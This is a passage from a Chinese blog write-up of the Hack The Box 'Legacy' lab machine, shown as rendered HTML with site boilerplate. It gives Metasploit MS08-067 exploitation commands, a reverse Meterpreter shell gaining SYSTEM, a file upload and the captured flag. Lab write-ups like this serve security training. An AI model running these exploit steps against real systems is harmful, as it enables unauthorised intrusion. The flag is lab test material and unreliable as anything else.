+</span></span><span class="line"><span class="cl"> c:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt  <span class="m">32</span>            2017-03-1614:18:50 +0800
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; cat <span class="s2">&#34;c:\Documents and Settings\Administrator\Desktop\root.txt&#34;</span>
+</span></span><span class="line"><span class="cl"> 993442d258b0e0ec917cae9e695d5713
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><p>serach -f 文件名查找文件路径</p>
+<p>Kali <code>/usr/share/windows-binaries</code>目录下自带一些Windows下命令</p>
+<h3 id="2ms08-067">2.ms08-067</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; use windows/smb/ms08_067_netapi
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> rhosts 10.10.10.4
+</span></span><span class="line"><span class="cl"> <span class="nv">rhosts</span> <span class="o">=</span>&gt; 10.10.10.4
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.10.14.2
+</span></span><span class="line"><span class="cl"> <span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.2
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.2:4444 
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Automatically detecting the target...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack <span class="m">3</span> - lang:English
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Attempting to trigger the vulnerability...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175174</span> bytes<span class="o">)</span> to 10.10.10.4
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">2</span> opened <span class="o">(</span>10.10.14.2:4444 -&gt; 10.10.10.4:1032 <span class="o">)</span> at 2022-03-15 14:42:38 +0800
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; upload /usr/share/windows-binaries/whoami.exe
+</span></span><span class="line"><span class="cl"> meterpreter &gt; shell
+</span></span><span class="line"><span class="cl"> C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+</span></span><span class="line"><span class="cl"> whoami
+</span></span><span class="line"><span class="cl"> NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><h2 id="他山之玉">他山之玉</h2>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_45527786/article/details/105124115"target="_blank" rel="external nofollow noopener noreferrer">Hackthebox walkthrough - Legacy（考点:smb利用 blue）</a>：使用了另一个exp工具：<a href="https://github.com/3ndG4me/AutoBlue-MS17-010"target="_blank" rel="external nofollow noopener noreferrer">AutoBlue-MS17-010</a>，提到了WindowsXP系统没有whoami的问题。</li>
+<li><a href="https://coldfusionx.github.io/posts/LegacyHTB/"target="_blank" rel="external nofollow noopener noreferrer">HackTheBox — Legacy Writeup</a>：使用了MS08-067（python脚本）和MS07-010（python脚本+MSF），提到了<code>/usr/share/windows-binaries/</code></li>
+<li>在OSCP的进攻方认证考试中只允许对一台主机用msf，所以在测试的时候尽量避免用msf（直接用msf很low）</li>
+</ul></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2022-03-20&#32;17:40:46>更新于 2022-03-20&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/htb/' class="post-tag">HTB</a><a href='/tags/oscp/' class="post-tag">OSCP</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/" class="post-nav-item" rel="prev" title="005-内网文件传输技术 Windows篇"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>005-内网文件传输技术 Windows篇</a>
+      <a href="/posts/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" class="post-nav-item" rel="next" title="HTB靶机 Lame WriteUp">HTB靶机 Lame WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="XavierRoot/XavierBlog"
+            data-repo-id="R_kgDOHswyxg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOHswyxs4Cd2zm"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="en"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
